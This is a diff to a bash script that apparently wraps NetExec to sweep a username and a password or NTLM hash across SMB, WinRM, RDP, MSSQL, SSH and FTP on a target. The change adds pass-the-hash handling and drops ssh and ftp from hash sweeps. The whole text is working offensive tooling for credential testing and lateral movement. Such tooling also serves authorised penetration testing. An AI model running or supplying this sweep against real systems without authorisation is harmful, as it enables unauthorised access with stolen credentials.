@@ -76,13 +76,18 @@ case "$SUBCMD" in
         fi
 
         AUTH_FLAG="-p"
+        PROTOS=(smb winrm rdp mssql ssh ftp)
         if [[ "$SECRET" =~ ^[0-9a-fA-F]{32}$ ]]; then
             AUTH_FLAG="-H"
             echo "[*] Input looks like an NTLM hash -- using pass-the-hash (-H)."
+            # ssh and ftp don't do NTLM auth -- nxc has no -H/--hash flag for either protocol, so
+            # including them here would just error out on an unrecognized argument every time.
+            echo "[*] ssh/ftp don't support NTLM pass-the-hash in nxc -- excluding them from this sweep."
+            PROTOS=(smb winrm rdp mssql)
         fi
 
-        echo "[*] Sweeping $USER against $TARGET across smb/winrm/rdp/mssql/ssh/ftp"
-        for proto in smb winrm rdp mssql ssh ftp; do
+        echo "[*] Sweeping $USER against $TARGET across ${PROTOS[*]}"
+        for proto in "${PROTOS[@]}"; do
             echo "--- $proto ---"
             OUTPUT="$(nxc "$proto" "$TARGET" -u "$USER" "$AUTH_FLAG" "$SECRET" 2>&1)"
             echo "$OUTPUT"
